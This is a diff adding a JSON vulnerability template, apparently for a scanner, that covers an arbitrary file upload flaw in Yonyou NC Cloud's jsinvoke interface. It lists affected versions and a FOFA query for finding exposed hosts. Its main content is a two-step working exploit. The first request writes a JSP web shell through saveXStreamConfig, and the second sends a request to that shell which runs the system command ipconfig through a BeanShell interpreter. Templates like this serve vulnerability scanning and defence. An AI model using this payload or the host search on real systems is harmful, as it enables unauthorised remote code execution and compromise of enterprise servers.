@@ -1,0 +1,53 @@
+{
+  "product": "用友NC Cloud",
+  "vul_name": "用友NC Cloud jsinvoke 任意文件上传",
+  "type": "文件上传",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "用友 NC Cloud 中存在 jsinvoke 接口的任意文件上传漏洞，攻击者可以通过利用此漏洞向系统上传任意恶意文件。",
+  "version": "NC63、NC633、NC65、NC Cloud1903、NC Cloud1909、NC Cloud2005、NC Cloud2105、NC Cloud2111、YonBIP高级版2207",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"用友-NC-Cloud\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/qq_56698744/article/details/134731967",
+  "fix": [],
+  "exploit": [
+    {
+      "exp": {
+        "method": "post",
+        "follow": false,
+        "path": "/uapjs/jsinvoke/?action=invoke",
+        "data": "{\"serviceName\":\"nc.itf.iufo.IBaseSPService\",\"methodName\":\"saveXStreamConfig\",\"parameterTypes\":[\"java.lang.Object\",\"java.lang.String\"],\"parameters\":[\"${param.getClass().forName(param.error).newInstance().eval(param.cmd)}\",\"webapps/nc_web/52e039302a62d077.jsp\"]}"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "status": 200
+          }
+        ]
+      }
+    },
+    {
+      "exp": {
+        "method": "post",
+        "follow": false,
+        "path": "/52e039302a62d077.jsp?error=bsh.Interpreter",
+        "data": "cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(\"ipconfig\").getInputStream())"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "status": 200,
+            "body": "IPv4"
+          }
+        ]
+      }
+    }
+  ]
+}
